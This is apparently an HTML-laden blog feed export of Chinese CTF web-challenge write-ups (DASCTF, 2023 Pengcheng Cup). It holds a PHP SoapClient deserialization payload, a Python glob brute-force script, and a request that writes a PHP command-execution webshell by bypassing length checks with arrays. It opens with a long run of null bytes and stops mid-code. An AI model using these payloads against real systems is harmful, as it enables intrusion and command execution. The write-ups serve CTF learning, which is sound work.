00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n--0f9486e921f5468f9ab50745c4c93267--\r\n&quot;</span>;<span class="hljs-keyword">try</span> &#123;    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;Enterpr1se\r\n&quot;</span> . <span class="hljs-string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$postdata</span>,<span class="hljs-number">2</span>,<span class="hljs-number">32</span>).<span class="hljs-string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span>.<span class="hljs-string">&quot;\r\n\r\n&quot;</span>.<span class="hljs-variable">$postdata</span>,        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/siranai.php&quot;</span>));&#125; <span class="hljs-keyword">catch</span> (SoapFault <span class="hljs-variable">$e</span>) &#123;&#125;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">siroha</span>();<span class="hljs-variable">$b</span>-&gt;koi=[<span class="hljs-string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;[<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;nnnnn&quot;</span>]];  <span class="hljs-comment">//细节，数组调用类方法，调用一个不存在的方法触发__call魔术方法</span><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));</code></pre></div><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118002357048.png" alt="image-20240118002357048"></p><p>生成的数据传参,记得Get那里传参一定要传有效的东西,否则脚本不会执行到反序列化那一步的.</p><p>第二次访问,就会变成我们写的任意php代码,就已经getshell了</p><p>复现不了一点，很烦，根本不会构造那么复杂的东西</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>虽然都看完了，但是到了做题时，我又写不出来出题人那么厉害的python代码，即使知道了方法，也还是会做不出来。。。。。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd">DAS X 0psu3 - 飞书云文档 (feishu.cn)</a></p><p><a href="https://boogipop.com/2023/12/15/DASCTF%20X%200psu3%20Web%20Writeup/">https://boogipop.com/2023/12/15/DASCTF%20X%200psu3%20Web%20Writeup/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023鹏城杯-web</title>
    <link href="/2024/01/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/"/>
    <url>/2024/01/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/</url>
    
    <content type="html"><![CDATA[<h1 id="2023鹏城杯-web-复现"><a href="#2023鹏城杯-web-复现" class="headerlink" title="2023鹏城杯-web 复现"></a>2023鹏城杯-web 复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当时打比赛被爆杀，只写出一个web，一个misc，后来没时间复现，现在来看看</p><h2 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h2><p>贼简单的pop链</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span> </span>&#123;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;&#125;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<span class="hljs-variable">$a</span>-&gt;username = <span class="hljs-variable">$b</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="web-2"><a href="#web-2" class="headerlink" title="web-2"></a>web-2</h2><p>filename 会传入 <code>scandir</code> 函数, 当目录存在时返回 yes 否则返回 no</p><p>这里我当时没什么思路，但是源代码中有<code>backdoor_[a-f0-9]&#123;16&#125;.php</code>，但是嫌麻烦，并且还是没啥思路，就算了</p><p>这里可以使用glob协议一位一位来进行判断，因为glob可以使用<code>*</code></p><p>爆破&#x2F;var&#x2F;www&#x2F;html</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requestsdicts = <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>flag = <span class="hljs-string">&#x27;&#x27;</span>i = <span class="hljs-number">1</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;testing&#x27;</span>, s)        url = <span class="hljs-string">&#x27;http://172.10.0.5/&#x27;</span>        res = requests.post(url, data=&#123;            <span class="hljs-string">&#x27;filename&#x27;</span>: <span class="hljs-string">&#x27;glob:///var/www/html/backdoor_&#x27;</span> + flag + s + <span class="hljs-string">&#x27;*&#x27;</span>,        &#125;)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;yesyesyes!!!&#x27;</span> <span class="hljs-keyword">in</span> res.text:            flag += s            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;found!!!&#x27;</span>, flag)            <span class="hljs-keyword">break</span>    i += <span class="hljs-number">1</span></code></pre></div><p>爆出<code>backdoor_00fbc51dcdf9eef767597fd26119a894.php</code></p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];        <span class="hljs-variable">$title</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">5</span>||<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>)&gt;<span class="hljs-number">3</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);        &#125;        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>,<span class="hljs-variable">$data</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$title</span>)) &lt;= <span class="hljs-number">10</span>) &#123;            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;php &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>一个队友拿到这个代码后给我，我第一眼以为是限制长度的RCE，但是条件太严行不通，就没有思路了</p><p>结果谁想到绕过十分简单，<strong>使用数组</strong>即可</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<span class="hljs-variable">$title</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">5</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>)&gt;<span class="hljs-number">3</span>);</code></pre></div><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115153333098.png" alt="image-20240115153333098"></p><p>payload:</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=exp10it&amp;title[]=123&amp;data[]=&lt;?=`nl+/*`;</span> <span class="hljs-meta">HTTP/1.1</span></code></pre></div><h2 id="Escape"><a href="#Escape" class="headerlink" title="Escape"></a>Escape</h2><p>赛后有战队wp中说这是外国一个比赛原题</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sqlite3 <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Responseapp = Flask(__name__)salt = <span class="hljs-string">b&#x27;****************&#x27;</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">PassHash</span>(<span class="hljs-title class_ inherited__">str</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):        <span class="hljs-keyword">return</span> sha512(salt + self.encode()).hexdigest()    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):        <span class="hljs-keyword">return</span> sha512(salt + self.encode()).hexdigest()con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)cur = con.cursor()cur.execute(<span class="hljs-string">&quot;DROP TABLE IF EXISTS users&quot;</span>)cur.execute(<span class="hljs-string">&quot;CREATE TABLE users(username, passhash)&quot;</span>)passhash = PassHash(<span class="hljs-string">&#x27;&#x27;</span>.join(choice(<span class="hljs-string">&quot;0123456789&quot;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)))cur.execute(    <span class="hljs-string">&quot;INSERT INTO users VALUES (?, ?)&quot;</span>,    (<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-built_in">str</span>(passhash)))con.commit()<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/source&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():    <span class="hljs-keyword">return</span> Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&quot;text/plain&quot;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.args <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.args:        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.html&quot;</span>).read()    <span class="hljs-keyword">else</span>:        username = request.args[<span class="hljs-string">&quot;username&quot;</span>]        new_pwd = PassHash(request.args[<span class="hljs-string">&quot;password&quot;</span>])        con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)        cur = con.cursor()        res = cur.execute(            <span class="hljs-string">&quot;SELECT * from users WHERE username = ? AND passhash = ?&quot;</span>,            (username, <span class="hljs-built_in">str</span>(new_pwd))        )        <span class="hljs-keyword">if</span> res.fetchone():            <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;secret.html&quot;</span>).read()        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span>                .<span class="hljs-built_in">format</span>(user=username)                .<span class="hljs-built_in">format</span>(passhash=new_pwd)                )<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">10000</span>)</code></pre></div><p>这题当时已经看出是python格式化字符串漏洞了，但是可惜不会利用，对flask没有特别了解</p><p>PassHash 虽然继承了 str, 但是只重写了 <code>__str__</code> 和 <code>__repr__</code> 两个方法, 实例化时传入的 password 明文其实还保存在对象里面</p><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115173816666.png" alt="image-20240115173816666"></p><p>大佬说法</p><blockquote><p>比如 <code>passhash.lower()</code> 依然显示的是原来的值</p><p><code>:&gt;0</code> 表示左对齐, 会调用父类 str 的 <code>__format__</code> 方法, 而不是 <code>__str__</code> 和 <code>__repr__</code>, 进而得到明文</p></blockquote><p>看了wp，感觉现在就是要先获取到PassHash这个类的实例</p><p>问了下GPT，大概是这样回答的，后来又问了一次，gpt纠错后的答案感觉不是很靠谱</p><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115174832002.png" alt="image-20240115174832002"></p><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115174817690.png" alt="image-20240115174817690"></p><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115173716134.png" alt="image-20240115173716134"></p><h3 id="获取密码明文"><a href="#获取密码明文" class="headerlink" title="获取密码明文"></a>获取密码明文</h3><p>实际测试</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Responseapp = Flask(__name__)salt = <span class="hljs-string">b&#x27;****************&#x27;</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">PassHash</span>(<span class="hljs-title class_ inherited__">str</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):        <span class="hljs-keyword">return</span> sha512(salt + self.encode()).hexdigest()    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):        <span class="hljs-keyword">return</span> sha512(salt + self.encode()).hexdigest()passhash = PassHash(<span class="hljs-string">&#x27;&#x27;</span>.join(choice(<span class="hljs-string">&quot;0123456789&quot;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)))<span class="hljs-built_in">print</span>(passhash)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    username = request.args[<span class="hljs-string">&quot;username&quot;</span>]    new_pwd = PassHash(request.args[<span class="hljs-string">&quot;password&quot;</span>])    <span 